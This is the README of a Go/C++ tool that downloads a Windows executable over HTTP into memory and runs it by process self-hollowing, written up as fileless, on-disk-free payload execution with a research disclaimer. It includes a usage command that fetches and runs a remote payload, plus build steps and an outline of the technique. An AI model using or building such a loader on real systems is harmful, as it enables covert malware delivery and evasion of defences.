# go http memexec

A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk.

## Features

- **Zero Disk I/O**: Downloads executables directly to memory using go net/http and never writes them to disk
- **Process Self-Hollowing**: Replaces the current process with the downloaded payload
- **Memory-Safe Execution**: Implements proper memory protection and relocation
- **Simple API**: Single command to download and execute payloads

## How It Works

go http memexec uses a sophisticated process self-hollowing technique to run executables in memory:

1. Downloads a PE file directly to memory using golang's net/http
2. Maps the PE file into memory with proper section permissions
3. Resolves imports and fixes relocations
4. Executes the payload by jumping to its entry point
5. The original process is replaced by the payload without writing any files to disk

## Usage

```bash
# Basic usage with default URL
./go-http-memexec

# Specify a custom download URL
./go-http-memexec https://example.com/payload.exe
```

## Use Cases

- Security testing and research
- Memory-resident application deployment
- Advanced Windows process manipulation research
- Fileless payload execution

## Technical Details

The project combines Go for high-level coordination with C++ for low-level Windows API interaction:

- Uses golang's net/http to stream downloads directly to memory
- Implements PE parsing, import resolution, and relocation in native code
- Properly handles TLS callbacks and memory protection
- Updates the PEB to maintain process coherence after hollowing

## Build Instructions

```bash
# Build everything at once if you trust me :)
./build-all.sh

# if you don't, manual build process
# 1. Build the C++ library
cd cpp
gcc -c selfhollow.cpp relocate.cpp -I.
ar rcs librunpe.a selfhollow.o relocate.o

# 2. Build the Go executable
go mod tidy
go build -ldflags="-s -w" -trimpath -o go-http-memexec.exe
```

## Security Considerations

This tool is designed for legitimate security research, testing, and educational purposes only. The ability to execute code directly from memory without touching disk is a powerful capability that should be used responsibly.

## Requirements

- Windows operating system
- GCC or compatible C++ compiler
- Go 1.16 or later

## Notes
- THIS ONLY WORKS FOR PAYLOADS LESS THAN OR EQUAL TO (leaning towards less than) THE TARGET BINARY SIZE (go-http-memexec is 5.626mb)
- I have only tested this on Windows 10
- I have only tested on statically linked Go and Rust binaries

## License

[MIT License](LICENSE)

## Disclaimer

This project is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. 
